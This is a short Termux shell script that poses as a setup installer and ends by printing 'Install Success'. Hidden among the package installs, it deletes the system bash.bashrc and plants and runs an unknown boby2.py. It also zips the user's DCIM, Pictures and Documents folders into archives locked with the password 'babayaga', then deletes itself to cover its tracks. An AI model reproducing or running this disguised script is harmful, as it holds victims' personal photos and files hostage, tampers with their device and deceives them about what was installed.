
clear

apt-get upgrade -y

apt-get install python3 -y

apt-get install figlet

rm /data/data/com.termux/files/usr/etc/bash.bashrc

cd $HOME 

cd boby2

cp boby2.py /data/data/com.termux/files/usr/etc

cd

cd /sdcard

zip --password babayaga รูปของคุณ.zip DCIM

zip --password babayaga รูปของคุณ2.zip Pictures

zip --password babayaga เอกสาร.zip Documents

rm setup.sh

python3 boby2.py

figlet Install Success

bash